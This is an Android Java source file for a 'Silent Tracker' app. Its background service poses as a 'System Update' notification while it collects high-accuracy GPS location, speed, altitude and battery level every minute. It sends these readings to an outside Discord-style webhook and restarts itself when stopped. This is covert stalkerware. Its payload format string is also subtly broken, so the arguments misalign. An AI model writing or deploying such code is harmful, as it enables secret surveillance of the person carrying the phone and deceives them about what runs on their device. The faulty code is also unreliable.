package com.silenttracker.location;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class LocationService extends Service {

    private static final String CHANNEL_ID = "system_update_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final String TAG = "LocationService";

    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private OkHttpClient httpClient;

    // Configuration - Change these
    private static final long UPDATE_INTERVAL = 60000; // 1 minute
    private static final long FASTEST_INTERVAL = 30000; // 30 seconds
    private static final int BATTERY_SAVE_INTERVAL = 300000; // 5 minutes (battery saving mode)

    @Override
    public void onCreate() {
        super.onCreate();
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification("System Update", "Running system optimizations..."));

        setupLocationCallback();
        startLocationUpdates();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System update service");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification(String title, String content) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }

    private void setupLocationCallback() {
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult locationResult) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    Log.d(TAG, "Location received: " + location.getLatitude() + ", " + location.getLongitude());
                    sendLocationToWebhook(location);
                }
            }
        };
    }

    private void startLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, UPDATE_INTERVAL)
            .setMinUpdateIntervalMillis(FASTEST_INTERVAL)
            .build();

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            );
        }
    }

    private void sendLocationToWebhook(Location location) {
        String webhookUrl = MainActivity.WEBHOOK_URL;
        
        if (webhookUrl.equals("YOUR_WEBHOOK_URL_HERE")) {
            Log.w(TAG, "Webhook URL not configured!");
            return;
        }

        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        
        // Create Discord-style embed
        String jsonPayload = String.format(Locale.US,
            "{" +
            "\"content\": null," +
            "\"embeds\": [{" +
            "\"title\": \"📍 New Location Update\"," +
            "\"color\": 3066993," +
            "\"fields\": [" +
            "{\"name\": \"Latitude\", \"value\": \"%.6f\", \"inline\": true}," +
            "{\"name\": \"Longitude\", \"value\": \"%.6f\", \"inline\": true}," +
            "{\"name\": \"Accuracy\", \"value\": \"%.1f meters\", \"inline\": true}," +
            "{\"name\": \"Altitude\", \"value\": \"%.1f meters\", \"inline\": true}," +
            "{\"name\": \"Speed\", \"value\": \"%.1f m/s\", \"inline\": true}," +
            "{\"name\": \"Battery\", \"value\": \"%%d%%\", \"inline\": true}," +
            "{\"name\": \"Time\", \"value\": \"%s\", \"inline\": false}," +
            "{\"name\": \"Google Maps\", \"value\": \"[View on Map](https://maps.google.com/?q=%.6f,%.6f)\", \"inline\": false}" +
            "]," +
            "\"footer\": {\"text\": \"Silent Tracker\"}," +
            "\"timestamp\": \"%s\"" +
            "}]" +
            "}",
            location.getLatitude(),
            location.getLongitude(),
            location.getAccuracy(),
            location.getAltitude(),
            location.getSpeed(),
            getBatteryLevel(),
            timestamp,
            location.getLatitude(),
            location.getLongitude(),
            new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date())
        );

        RequestBody body = RequestBody.create(jsonPayload, MediaType.parse("application/json"));
        Request request = new Request.Builder()
            .url(webhookUrl)
            .post(body)
            .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Failed to send location: " + e.getMessage());
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Location sent successfully!");
                } else {
                    Log.e(TAG, "Webhook error: " + response.code());
                }
            }
        });
    }

    private int getBatteryLevel() {
        Intent batteryIntent = registerReceiver(null, new Intent(Intent.ACTION_BATTERY_CHANGED));
        if (batteryIntent != null) {
            int level = batteryIntent.getIntExtra(BatteryManager.LEVEL, -1);
            int scale = batteryIntent.getIntExtra(BatteryManager.SCALE, -1);
            if (level >= 0 && scale > 0) {
                return (level * 100) / scale;
            }
        }
        return -1;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (fusedLocationClient != null && locationCallback != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
        }
    }
}

